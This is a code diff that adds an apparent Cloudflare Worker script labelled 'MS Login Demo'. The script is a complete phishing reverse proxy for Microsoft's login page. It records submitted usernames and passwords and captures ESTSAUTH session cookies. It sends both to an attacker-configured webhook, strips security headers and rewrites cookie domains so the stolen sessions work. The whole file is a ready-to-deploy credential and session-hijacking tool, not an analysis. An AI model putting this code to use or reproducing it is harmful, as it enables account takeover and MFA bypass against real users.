@@ -1,0 +1,118 @@
+// MS Login Demo
+const upstream = 'login.microsoftonline.com';
+const upstream_path = '/';
+const https = true;
+const webhook = "<Enter your Productive App Webhook URL>";
+
+// Blocking configurations
+const blocked_region = [];
+const blocked_ip_address = ['0.0.0.0', '127.0.0.1'];
+
+addEventListener('fetch', event => {
+    event.respondWith(fetchAndApply(event.request));
+});
+
+async function fetchAndApply(request) {
+    const region = (request.headers.get('cf-ipcountry') || '').toUpperCase();
+    const ip_address = request.headers.get('cf-connecting-ip');
+    const url = new URL(request.url);
+
+    // Protocol adjustment
+    url.protocol = https ? 'https:' : 'http:';
+    url.host = upstream;
+    url.pathname = url.pathname === '/' ? upstream_path : upstream_path + url.pathname;
+
+    // Block access by region or IP
+    if (blocked_region.includes(region) || blocked_ip_address.includes(ip_address)) {
+        return new Response('Access denied', { status: 403 });
+    }
+
+    const new_request_headers = new Headers(request.headers);
+    new_request_headers.set('Host', upstream);
+    new_request_headers.set('Referer', `${url.protocol}//${url.hostname}`);
+
+    // Handling POST requests to capture login credentials
+    if (request.method === 'POST') {
+        const bodyText = await request.clone().text();
+        const credentials = parseCredentials(bodyText);
+        if (credentials) {
+            await sendToSlack(credentials, webhook);
+        }
+    }
+
+    // Fetch response from upstream server
+    const original_response = await fetch(url.href, {
+        method: request.method,
+        headers: new_request_headers,
+        body: request.body
+    });
+
+    // Handle WebSocket upgrade
+    if (new_request_headers.get("Upgrade")?.toLowerCase() === "websocket") {
+        return original_response;
+    }
+
+    // Modify response headers
+    const new_response_headers = new Headers(original_response.headers);
+    new_response_headers.set('access-control-allow-origin', '*');
+    new_response_headers.set('access-control-allow-credentials', 'true');
+    ['content-security-policy', 'content-security-policy-report-only', 'clear-site-data']
+        .forEach(header => new_response_headers.delete(header));
+
+    // Replace domains in cookies
+    replaceCookieDomains(new_response_headers, url.hostname);
+
+    const modified_text = await replace_response_text(original_response.clone(), upstream, url.hostname);
+
+    // Check for important cookies and send alert
+    const all_cookies = new_response_headers.getAll("Set-Cookie").join("; ");
+    if (all_cookies.includes('ESTSAUTH') && all_cookies.includes('ESTSAUTHPERSISTENT')) {
+        await sendToSlack(`<b>Cookies found:</b><br>${all_cookies}`, webhook);
+    }
+
+    return new Response(modified_text, {
+        status: original_response.status,
+        headers: new_response_headers
+    });
+}
+
+// Parse credentials from POST body
+function parseCredentials(body) {
+    const params = new URLSearchParams(body);
+    const username = params.get('login');
+    const password = params.get('passwd');
+    if (username && password) {
+        return `<b>User</b>: ${decodeURIComponent(username)}<br><b>Password</b>: ${decodeURIComponent(password)}<br>`;
+    }
+    return null;
+}
+
+// Replace Set-Cookie domain values
+function replaceCookieDomains(headers, hostname) {
+    const cookies = headers.getAll("Set-Cookie");
+    headers.delete("Set-Cookie");
+    cookies.forEach(cookie => {
+        headers.append("Set-Cookie", cookie.replace(/login\.microsoftonline\.com/g, hostname));
+    });
+}
+
+// Replace response text with the host name
+async function replace_response_text(response, upstream_domain, host_name) {
+    const text = await response.text();
+    return text.replace(new RegExp(upstream_domain, 'g'), host_name);
+}
+
+// Send message to Slack webhook
+async function sendToSlack(message, webhookUrl) {
+    const payload = { text: message };
+    try {
+        const response = await fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        if (!response.ok) throw new Error('Failed to send message to Slack');
+    } catch (error) {
+        console.error(`Error sending to Slack: ${error.message}`);
+    }
+}
